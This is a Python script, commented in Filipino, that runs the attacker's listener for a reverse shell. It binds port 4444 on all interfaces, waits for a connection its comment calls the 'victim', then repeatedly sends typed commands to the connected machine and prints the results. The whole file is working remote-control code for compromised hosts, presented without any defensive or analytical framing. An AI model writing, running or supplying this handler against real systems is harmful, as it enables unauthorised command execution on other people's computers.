import socket
from termcolor import colored
import colorama
import os

colorama.init()

host = "0.0.0.0" # para makuha niya lahat ng IP na possible
port = 4444

timeout = 2

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((host,port)) # create connect sa victim
    s.listen(2)
    print(f"listening on Host: {host}, Port: {port}")
    conn, addr = s.accept()
    print(colored(f"Connection established with {addr}", "black", "on_light_green"))
    conn.settimeout(timeout)

    while True:
        try:
            cmd = input(colored(f"Shell> ", "green"))
            if cmd.lower() == "cwd":
                print(f"Current Directory: {os.getcwd()}")
            if cmd.lower() == "exit":
                print("Closing connection.")
                conn.send(cmd.encode("utf-8"))
                break
            conn.send(cmd.encode("utf-8"))
            output = conn.recv(4000).decode("utf-8")

            if not output:
                print("No output received (timeout). Try again.")
            else:
                print(output)
        except socket.timeout:
            pass
        except Exception as e:
            print(f"Error: {e}")
            break
    conn.close()
